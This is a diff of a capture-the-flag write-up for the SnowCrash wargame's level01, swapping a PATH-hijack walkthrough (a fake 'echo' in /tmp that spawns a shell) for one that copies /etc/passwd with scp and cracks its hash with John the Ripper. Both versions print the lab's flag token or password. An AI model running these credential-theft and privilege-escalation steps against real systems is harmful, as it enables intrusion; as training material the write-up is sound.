@@ -1,39 +1,24 @@
-# cat level01.s
+Find that /etc/passwd doesn't have the regulary permission, you can actually read it
+
+
+get it
+`scp -P 4242 level01@[ip]:/etc/passwd .`
+
+john the ripper out of it (a famous password decryption tool) :
+`john passwd`
+
+you will get an output like this:
 ```
-	...
-	.LC0:
-		.string	"/usr/bin/env echo Try to understand this level01.s .."
-		.text
-		.globl	main
-		.type	main, @function
-	...
+[Gosti] ~/42shit/42_Snowcrash/level01/Ressources ~➤  john passwd
+Created directory: /Users/gostimacbook/.john
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefg          (flag01)
+1g 0:00:00:00 100% 2/3 100.0g/s 139300p/s 139300c/s 139300C/s raquel..bigman
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
 ```
 
-# we can see the dev use the env to call the echo
-# he didnt use /bin/echo so we can fake echo function by changing $PATH from env
-```
-	PATH=/tmp/hack/:$PATH
-```
-# after that we just need to change echo by whatever
-```
-	touch /tmp/hack/echo
-	vi /tmp/hack/echo
-```
-# here we want a shell
-```
-	#!/bin/sh
-	bash
-```
-# then just run ~/level01
-# getflag
-```
-	level01@BornToSec:~$ cat /tmp/tommy/echo
-	#!/bin/sh
-	bash
+you can see the password for the flag01 as `abcdefg`
 
-	level01@BornToSec:~$ ./level01
-	bash: /home/user/level01/.bashrc: Permission denied
-	
-	flag01@BornToSec:~$ getflag
-	Check flag.Here is your token : f2av5il02puano7naaf6adaaf
-```
+now login as flag01 and get the flag with getflag
